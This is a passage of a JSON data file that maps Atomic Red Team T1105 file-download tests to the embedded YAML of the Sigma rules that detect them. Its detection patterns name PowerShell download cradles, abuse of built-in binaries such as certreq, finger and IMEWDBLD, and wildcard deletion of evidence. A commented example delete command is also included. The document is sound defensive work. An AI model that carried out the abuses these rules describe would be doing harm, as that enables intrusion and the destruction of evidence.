                        "remote_content": "title: Suspicious Script Execution From Temp Folder\nid: a6a39bdb-935c-4f0a-ab77-35f4bbf44d33\nstatus: test\ndescription: Detects a suspicious script executions from temporary folder\nreferences:\n    - https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/\nauthor: Florian Roth (Nextron Systems), Max Altgelt (Nextron Systems), Tim Shelton\ndate: 2021-07-14\nmodified: 2022-10-05\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\mshta.exe'\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n        CommandLine|contains:\n            - '\\Windows\\Temp'\n            - '\\Temporary Internet'\n            - '\\AppData\\Local\\Temp'\n            - '\\AppData\\Roaming\\Temp'\n            - '%TEMP%'\n            - '%TMP%'\n            - '%LocalAppData%\\Temp'\n    filter:\n        CommandLine|contains:\n            - ' >'\n            - 'Out-File'\n            - 'ConvertTo-Json'\n            - '-WindowStyle hidden -Verb runAs'  # VSCode behaviour if file cannot be written as current user\n            - '\\Windows\\system32\\config\\systemprofile\\AppData\\Local\\Temp\\Amazon\\EC2-Windows\\' # EC2 AWS\n    condition: selection and not filter\nfalsepositives:\n    - Administrative scripts\nlevel: high\n"
                    },
                    {
                        "rule_name": "PowerShell Web Download",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_cradles.yml",
                        "remote_content": "title: PowerShell Web Download\nid: 6e897651-f157-4d8f-aaeb-df8151488385\nstatus: test\ndescription: Detects suspicious ways to download files or content using PowerShell\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-01-05\ntags:\n    - attack.command-and-control\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    condition: selection\nfalsepositives:\n    - Scripts or tools that download files\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Suspicious Invoke-WebRequest Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_invoke_webrequest_download.yml",
                        "remote_content": "title: Suspicious Invoke-WebRequest Execution\nid: 5e3cc4d8-3e68-43db-8656-eaaeefdec9cc\nrelated:\n    - id: e218595b-bbe7-4ee5-8a96-f32a24ad3468\n      type: derived\nstatus: test\ndescription: Detects a suspicious call to Invoke-WebRequest cmdlet where the and output is located in a suspicious location\nreferences:\n    - https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-02\nmodified: 2024-02-23\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n    selection_commands:\n        CommandLine|contains:\n            # These are all aliases of Invoke-WebRequest\n            - 'curl '\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'wget '\n    selection_flags:\n        CommandLine|contains:\n            - ' -ur'\n            - ' -o'\n    selection_susp_locations:\n        CommandLine|contains:\n            - '\\AppData\\'\n            - '\\Desktop\\'\n            - '\\Temp\\'\n            - '\\Users\\Public\\'\n            - '%AppData%'\n            - '%Public%'\n            - '%Temp%'\n            - '%tmp%'\n            - ':\\Windows\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1105",
                "atomic_attack_guid": "97116a3f-efac-4b26-8336-b9cb18c45188",
                "atomic_attack_name": "Download a file using wscript",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/windows/process_creation/proc_creation_win_wscript_cscript_script_exec.yml",
                        "remote_content": "title: WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript\nid: 1e33157c-53b1-41ad-bbcc-780b80b58288\nrelated:\n    - id: 23250293-eed5-4c39-b57a-841c8933a57d\n      type: obsolete\n    - id: cea72823-df4d-4567-950c-0b579eaf0846\n      type: derived\nstatus: test\ndescription: Detects script file execution (.js, .jse, .vba, .vbe, .vbs, .wsf) by Wscript/Cscript\nreferences:\n    - https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/\n    - https://redcanary.com/blog/gootloader/\nauthor: Michael Haag\ndate: 2019-01-16\nmodified: 2023-05-15\ntags:\n    - attack.execution\n    - attack.t1059.005\n    - attack.t1059.007\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName:\n              - 'wscript.exe'\n              - 'cscript.exe'\n        - Image|endswith:\n              - '\\wscript.exe'\n              - '\\cscript.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '.js'\n            - '.jse'\n            - '.vba'\n            - '.vbe'\n            - '.vbs'\n            - '.wsf'\n    condition: all of selection_*\nfalsepositives:\n    - Some additional tuning is required. It is recommended to add the user profile path in CommandLine if it is getting too noisy.\nlevel: medium\n"
                    }
                ]
            },
            {
                "tech_id": "T1105",
                "atomic_attack_guid": "6fdaae87-c05b-42f8-842e-991a74e8376b",
                "atomic_attack_name": "certreq download",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Suspicious Certreq Command to Download",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_lolbin_susp_certreq_download.yml",
                        "remote_content": "title: Suspicious Certreq Command to Download\nid: 4480827a-9799-4232-b2c4-ccc6c4e9e12b\nstatus: test\ndescription: Detects a suspicious certreq execution taken from the LOLBAS examples, which can be abused to download (small) files\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Certreq/\nauthor: Christian Burkard (Nextron Systems)\ndate: 2021-11-24\nmodified: 2022-06-13\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certreq.exe'\n        - OriginalFileName: 'CertReq.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' -Post '\n            - ' -config '\n            - ' http'\n            - ' C:\\windows\\win.ini '\n    condition: all of selection*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unlikely\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1105",
                "atomic_attack_guid": "ed0335ac-0354-400c-8148-f6151d20035a",
                "atomic_attack_name": "Lolbas replace.exe use to copy UNC file",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Replace.exe Usage",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_lolbin_replace.yml",
                        "remote_content": "title: Replace.exe Usage\nid: 9292293b-8496-4715-9db6-37028dcda4b3\nstatus: test\ndescription: Detects the use of Replace.exe which can be used to replace file with another file\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Replace/\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/replace\nauthor: frack113\ndate: 2022-03-06\nmodified: 2024-03-13\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\replace.exe'\n    argument:\n        CommandLine|contains|windash: '-a'\n    condition: selection and argument\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Greedy File Deletion Using Del",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_cmd_del_greedy_deletion.yml",
                        "remote_content": "title: Greedy File Deletion Using Del\nid: 204b17ae-4007-471b-917b-b917b315c5db\nstatus: test\ndescription: Detects execution of the \"del\" builtin command to remove files using greedy/wildcard expression. This is often used by malware to delete content of folders that perhaps contains the initial malware infection or to delete evidence.\nreferences:\n    - https://www.joesandbox.com/analysis/509330/0/html#1044F3BDBE3BB6F734E357235F4D5898582D\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/erase\nauthor: frack113 , X__Junior (Nextron Systems)\ndate: 2021-12-02\nmodified: 2023-09-11\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Example:\n    #   del C:\\ProgramData\\*.dll & exit\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_del:\n        CommandLine|contains:\n            - 'del '\n            - 'erase '\n    selection_extensions:\n        CommandLine|contains:\n            - '\\\\\\*.au3'\n            - '\\\\\\*.dll'\n            - '\\\\\\*.exe'\n            - '\\\\\\*.js'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    }
                ]
            },
            {
                "tech_id": "T1105",
                "atomic_attack_guid": "54782d65-12f0-47a5-b4c1-b70ee23de6df",
                "atomic_attack_name": "Lolbas replace.exe use to copy file",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Replace.exe Usage",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_lolbin_replace.yml",
                        "remote_content": "title: Replace.exe Usage\nid: 9292293b-8496-4715-9db6-37028dcda4b3\nstatus: test\ndescription: Detects the use of Replace.exe which can be used to replace file with another file\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Replace/\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/replace\nauthor: frack113\ndate: 2022-03-06\nmodified: 2024-03-13\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\replace.exe'\n    argument:\n        CommandLine|contains|windash: '-a'\n    condition: selection and argument\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Greedy File Deletion Using Del",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_cmd_del_greedy_deletion.yml",
                        "remote_content": "title: Greedy File Deletion Using Del\nid: 204b17ae-4007-471b-917b-b917b315c5db\nstatus: test\ndescription: Detects execution of the \"del\" builtin command to remove files using greedy/wildcard expression. This is often used by malware to delete content of folders that perhaps contains the initial malware infection or to delete evidence.\nreferences:\n    - https://www.joesandbox.com/analysis/509330/0/html#1044F3BDBE3BB6F734E357235F4D5898582D\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/erase\nauthor: frack113 , X__Junior (Nextron Systems)\ndate: 2021-12-02\nmodified: 2023-09-11\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Example:\n    #   del C:\\ProgramData\\*.dll & exit\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_del:\n        CommandLine|contains:\n            - 'del '\n            - 'erase '\n    selection_extensions:\n        CommandLine|contains:\n            - '\\\\\\*.au3'\n            - '\\\\\\*.dll'\n            - '\\\\\\*.exe'\n            - '\\\\\\*.js'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    }
                ]
            },
            {
                "tech_id": "T1105",
                "atomic_attack_guid": "49845fc1-7961-4590-a0f0-3dbcf065ae7e",
                "atomic_attack_name": "Printer Migration Command-Line Tool UNC share folder into a zip file",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "File Deletion Via Del",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_cmd_del_execution.yml",
                        "remote_content": "title: File Deletion Via Del\nid: 379fa130-190e-4c3f-b7bc-6c8e834485f3\nstatus: test\ndescription: |\n    Detects execution of the builtin \"del\"/\"erase\" commands in order to delete files.\n    Adversaries may delete files left behind by the actions of their intrusion activity.\n    Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how.\n    Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.004/T1070.004.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/erase\nauthor: frack113\ndate: 2022-01-15\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_del:\n        CommandLine|contains:\n            - 'del '\n            - 'erase '\n    selection_flags:\n        CommandLine|contains|windash:\n            - ' -f' # Force deleting of read-only files.\n            - ' -s' # Delete specified files from all subdirectories.\n            - ' -q' # Quiet mode, do not ask if ok to delete on global wildcard\n    condition: all of selection_*\nfalsepositives:\n    - False positives levels will differ Depending on the environment. You can use a combination of ParentImage and other keywords from the CommandLine field to filter legitimate activity\nlevel: low\n"
                    },
                    {
                        "rule_name": "Potentially Suspicious CMD Shell Output Redirect",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_cmd_redirection_susp_folder.yml",
                        "remote_content": "title: Potentially Suspicious CMD Shell Output Redirect\nid: 8e0bb260-d4b2-4fff-bb8d-3f82118e6892\nrelated:\n    - id: aa2efee7-34dd-446e-8a37-40790a66efd7\n      type: derived\n    - id: 4f4eaa9f-5ad4-410c-a4be-bc6132b0175a\n      type: similar\nstatus: test\ndescription: |\n    Detects inline Windows shell commands redirecting output via the \">\" symbol to a suspicious location.\n    This technique is sometimes used by malicious actors in order to redirect the output of reconnaissance commands such as \"hostname\" and \"dir\" to files for future exfiltration.\nreferences:\n    - https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-07-12\nmodified: 2024-03-19\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cli_1:\n        CommandLine|contains:\n            # Note: Add more suspicious locations as you find them\n            # Note: The space from the start is missing to cover append operations \">>\"\n            # Note: We use the \"?\" to account for both a single and a double quote\n            # Note: If you want to account for more spaces which is still a valid bypass option. Use a regex with \"\\s\"\n            - '>?%APPDATA%\\'\n            - '>?%TEMP%\\'\n            - '>?%TMP%\\'\n            - '>?%USERPROFILE%\\'\n            - '>?C:\\ProgramData\\'\n            - '>?C:\\Temp\\'\n            - '>?C:\\Users\\Public\\'\n            - '>?C:\\Windows\\Temp\\'\n    selection_cli_2:\n        CommandLine|contains:\n            - ' >'\n            - '\">'\n            - \"'>\"\n        CommandLine|contains|all:\n            - 'C:\\Users\\'\n            - '\\AppData\\Local\\'\n    condition: selection_img and 1 of selection_cli_*\nfalsepositives:\n    - Legitimate admin or third party scripts used for diagnostic collection might generate some false positives\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Greedy File Deletion Using Del",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_cmd_del_greedy_deletion.yml",
                        "remote_content": "title: Greedy File Deletion Using Del\nid: 204b17ae-4007-471b-917b-b917b315c5db\nstatus: test\ndescription: Detects execution of the \"del\" builtin command to remove files using greedy/wildcard expression. This is often used by malware to delete content of folders that perhaps contains the initial malware infection or to delete evidence.\nreferences:\n    - https://www.joesandbox.com/analysis/509330/0/html#1044F3BDBE3BB6F734E357235F4D5898582D\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/erase\nauthor: frack113 , X__Junior (Nextron Systems)\ndate: 2021-12-02\nmodified: 2023-09-11\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Example:\n    #   del C:\\ProgramData\\*.dll & exit\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_del:\n        CommandLine|contains:\n            - 'del '\n            - 'erase '\n    selection_extensions:\n        CommandLine|contains:\n            - '\\\\\\*.au3'\n            - '\\\\\\*.dll'\n            - '\\\\\\*.exe'\n            - '\\\\\\*.js'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    },
                    {
                        "rule_name": "PrintBrm ZIP Creation of Extraction",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_lolbin_printbrm.yml",
                        "remote_content": "title: PrintBrm ZIP Creation of Extraction\nid: cafeeba3-01da-4ab4-b6c4-a31b1d9730c7\nstatus: test\ndescription: Detects the execution of the LOLBIN PrintBrm.exe, which can be used to create or extract ZIP files. PrintBrm.exe should not be run on a normal workstation.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/PrintBrm/\nauthor: frack113\ndate: 2022-05-02\ntags:\n    - attack.command-and-control\n    - attack.t1105\n    - attack.defense-evasion\n    - attack.t1564.004\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '\\PrintBrm.exe'\n        CommandLine|contains|all:\n            - ' -f'\n            - '.zip'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1105",
                "atomic_attack_guid": "1a02df58-09af-4064-a765-0babe1a0d1e2",
                "atomic_attack_name": "Download a file with IMEWDBLD.exe",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Arbitrary File Download Via IMEWDBLD.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_imewbdld_download.yml",
                        "remote_content": "title: Arbitrary File Download Via IMEWDBLD.EXE\nid: 863218bd-c7d0-4c52-80cd-0a96c09f54af\nrelated:\n    - id: 8d7e392e-9b28-49e1-831d-5949c6281228\n      type: derived\nstatus: test\ndescription: Detects usage of \"IMEWDBLD.exe\" to download arbitrary files\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1105/T1105.md#atomic-test-10---windows---powershell-download\n    - https://lolbas-project.github.io/lolbas/Binaries/IMEWDBLD/\nauthor: Swachchhanda Shrawan Poudel\ndate: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\IMEWDBLD.exe'\n        - OriginalFileName: 'imewdbld.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\n# Note: Please reduce this to medium if you find legitimate use case of this utility with a URL\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1105",
                "atomic_attack_guid": "5f507e45-8411-4f99-84e7-e38530c45d01",
                "atomic_attack_name": "File download with finger.exe on Windows",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Finger.EXE Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_finger_execution.yml",
                        "remote_content": "title: Finger.EXE Execution\nid: af491bca-e752-4b44-9c86-df5680533dbc\nstatus: test\ndescription: |\n    Detects execution of the \"finger.exe\" utility.\n    Finger.EXE or \"TCPIP Finger Command\" is an old utility that is still present on modern Windows installation. It Displays information about users on a specified remote computer (typically a UNIX computer) that is running the finger service or daemon.\n    Due to the old nature of this utility and the rareness of machines having the finger service. Any execution of \"finger.exe\" can be considered \"suspicious\" and worth investigating.\nreferences:\n    - https://twitter.com/bigmacjpg/status/1349727699863011328?s=12\n    - https://app.any.run/tasks/40115012-a919-4208-bfed-41e82cb3dadf/\n    - http://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt\nauthor: Florian Roth (Nextron Systems), omkar72, oscd.community\ndate: 2021-02-24\nmodified: 2024-06-27\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - OriginalFileName: 'finger.exe'\n        - Image|endswith: '\\finger.exe'\n    condition: selection\nfalsepositives:\n    - Admin activity (unclear what they do nowadays with finger.exe)\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1105",
                "atomic_attack_guid": "815bef8b-bf91-4b67-be4c-abe4c2a94ccc",
                "atomic_attack_name": "Download a File with Windows Defender MpCmdRun.exe",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Use Short Name Path in Command Line",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_ntfs_short_name_path_use_cli.yml",
                        "remote_content": "title: Use Short Name Path in Command Line\nid: 349d891d-fef0-4fe4-bc53-eee623a15969\nrelated:\n    - id: a96970af-f126-420d-90e1-d37bf25e50e1\n      type: similar\nstatus: test\ndescription: Detect use of the Windows 8.3 short name. Which could be used as a method to avoid command-line detection\nreferences:\n    - https://www.acunetix.com/blog/articles/windows-short-8-3-filenames-web-security-problem/\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc959352(v=technet.10)\n    - https://twitter.com/frack113/status/1555830623633375232\nauthor: frack113, Nasreddine Bencherchali\ndate: 2022-08-07\nmodified: 2022-10-26\ntags:\n    - attack.defense-evasion\n    - attack.t1564.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '~1\\'\n            - '~2\\'\n    filter:\n        - ParentImage:\n              - 'C:\\Windows\\System32\\Dism.exe'\n              - 'C:\\Windows\\System32\\cleanmgr.exe'\n              - 'C:\\Program Files\\GPSoftware\\Directory Opus\\dopus.exe'\n        - ParentImage|endswith:\n              - '\\WebEx\\WebexHost.exe'\n              - '\\thor\\thor64.exe'\n              - '\\veam.backup.shell.exe'\n              - '\\winget.exe'\n              - '\\Everything\\Everything.exe'\n        - ParentImage|contains: '\\AppData\\Local\\Temp\\WinGet\\'\n        - CommandLine|contains:\n              - '\\appdata\\local\\webex\\webex64\\meetings\\wbxreport.exe'\n              - 'C:\\Program Files\\Git\\post-install.bat'\n              - 'C:\\Program Files\\Git\\cmd\\scalar.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Applications could use this notation occasionally which might generate some false positives. In that case investigate the parent and child process.\nlevel: medium\n"
                    }
                ]
            },
            {
                "tech_id": "T1105",
                "atomic_attack_guid": "fa5a2759-41d7-4e13-a19c-e8f28a53566f",
                "atomic_attack_name": "svchost writing a file to a UNC path",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Suspicious Copy From or To System Directory",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_copy_system_dir.yml",
                        "remote_content": "title: Suspicious Copy From or To System Directory\nid: fff9d2b7-e11c-4a69-93d3-40ef66189767\nrelated:\n    - id: 855bc8b5-2ae8-402e-a9ed-b889e6df1900\n      type: derived\nstatus: test\ndescription: |\n    Detects a suspicious copy operation that tries to copy a program from system (System32, SysWOW64, WinSxS) directories to another on disk.\n    Often used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations.\nreferences:\n    - https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120\n    - https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html\n    - https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/\nauthor: Florian Roth (Nextron Systems), Markus Neis, Tim Shelton (HAWK.IO), Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-07-03\nmodified: 2023-08-29\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: 'copy '\n    selection_pwsh:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - 'copy-item'\n            - ' copy '\n            - 'cpi '\n            - ' cp '\n    selection_other:\n        - Image|endswith:\n              - '\\robocopy.exe'\n              - '\\xcopy.exe'\n        - OriginalFileName:\n              - 'robocopy.exe'\n              - 'XCOPY.EXE'\n    target:\n        CommandLine|contains:\n            - '\\System32'\n            - '\\SysWOW64'\n            - '\\WinSxS'\n    condition: 1 of selection_* and target\nfalsepositives:\n    - Depend on scripts and administrative tools used in the monitored environment (For example an admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/)\n    - When cmd.exe and xcopy.exe are called directly #  C:\\Windows\\System32\\cmd.exe /c copy file1 file2\n    - When the command contains the keywords but not in the correct order\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Copy From Or To Admin Share Or Sysvol Folder",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_copy_lateral_movement.yml",
                        "remote_content": "title: Copy From Or To Admin Share Or Sysvol Folder\nid: 855bc8b5-2ae8-402e-a9ed-b889e6df1900\nstatus: test\ndescription: Detects a copy command or a copy utility execution to or from an Admin share or remote\nreferences:\n    - https://twitter.com/SBousseaden/status/1211636381086339073\n    - https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view\n    - https://www.elastic.co/guide/en/security/current/remote-file-copy-to-a-hidden-share.html\n    - https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/\nauthor: Florian Roth (Nextron Systems), oscd.community, Teymur Kheirkhabarov @HeirhabarovT, Zach Stanford @svch0st, Nasreddine Bencherchali\ndate: 2019-12-30\nmodified: 2023-11-15\ntags:\n    - attack.lateral-movement\n    - attack.collection\n    - attack.exfiltration\n    - attack.t1039\n    - attack.t1048\n    - attack.t1021.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_target:\n        CommandLine|contains:\n            - '\\\\\\\\*$'\n            - '\\Sysvol\\'\n    selection_other_tools:\n        - Image|endswith:\n              - '\\robocopy.exe'\n              - '\\xcopy.exe'\n        - OriginalFileName:\n              - 'robocopy.exe'\n              - 'XCOPY.EXE'\n    selection_cmd_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cmd_cli:\n        CommandLine|contains: 'copy'\n    selection_pwsh_img:\n        - Image|contains:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n    selection_pwsh_cli:\n        CommandLine|contains:\n            - 'copy-item'\n            - 'copy '\n            - 'cpi '\n            - ' cp '\n            - 'move '\n            - 'move-item'\n            - ' mi '\n            - ' mv '\n    condition: selection_target and (selection_other_tools or all of selection_cmd_* or all of selection_pwsh_*)\nfalsepositives:\n    - Administrative scripts\nlevel: medium\n"
                    }
                ]
            },
            {
                "tech_id": "T1105",
                "atomic_attack_guid": "2ca61766-b456-4fcf-a35a-1233685e1cad",
                "atomic_attack_name": "OSTAP Worming Activity",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "File Deletion Via Del",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_cmd_del_execution.yml",
                        "remote_content": "title: File Deletion Via Del\nid: 379fa130-190e-4c3f-b7bc-6c8e834485f3\nstatus: test\ndescription: |\n    Detects execution of the builtin \"del\"/\"erase\" commands in order to delete files.\n    Adversaries may delete files left behind by the actions of their intrusion activity.\n    Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how.\n    Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.004/T1070.004.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/erase\nauthor: frack113\ndate: 2022-01-15\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_del:\n        CommandLine|contains:\n            - 'del '\n            - 'erase '\n    selection_flags:\n        CommandLine|contains|windash:\n            - ' -f' # Force deleting of read-only files.\n            - ' -s' # Delete specified files from all subdirectories.\n            - ' -q' # Quiet mode, do not ask if ok to delete on global wildcard\n    condition: all of selection_*\nfalsepositives:\n    - False positives levels will differ Depending on the environment. You can use a combination of ParentImage and other keywords from the CommandLine field to filter legitimate activity\nlevel: low\n"
                    }
